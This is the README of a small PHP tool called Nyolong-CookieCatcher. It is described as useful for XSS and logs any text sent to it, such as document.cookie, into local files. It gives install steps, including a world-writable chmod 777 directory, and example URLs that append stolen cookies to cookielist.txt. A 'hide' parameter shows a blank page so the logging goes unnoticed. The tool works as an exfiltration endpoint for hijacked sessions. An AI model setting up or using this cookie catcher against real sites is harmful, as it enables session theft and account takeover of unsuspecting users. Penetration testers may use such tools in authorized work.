# Nyolong-CookieCatcher
Nyolong is an independent single php file, designed with simplicity in mind to serve its purpose: Save anything given to it to local txt files. Useful for XSS.

# How to install
Clone or save index.php file to your server. Make sure to make the directory containing it to be writable by everyone / www-data.

Step-by-step:
* clone this repository : `git clone https://github.com/adamyordan/Nyolong-CookieCatcher.git nyolong`
* make directory nyolong writable : `chmod -R 777 nyolong`
* (optional) configure constant in the index.php, such as commands, default text filename.

# Usage guide
To open statistic or result, open the nyolong index.php file, for example `http://example.com/nyolong/`

To save text (such as document.cookie), open index.php with GET parameter `text`, for example `http://example.com/nyolong/?text=this text will be saved`

| default parameter | description                                              |
| ----------------- |----------------------------------------------------------|
| file              | filename to save caught text, default: caught.txt        |
| text              | text to catch, appended to file                          |
| clear             | clear all texts in specified file `/nyolong/?clear`      |
| hide              | do not show anything in page, the page will be all white |

Example: `http://example.com/nyolong/?file=cookielist.txt&text=newtext&hide`

This example will append `newtext` to `cookielist.txt`, and will not show statistic / result when a user open this url. 
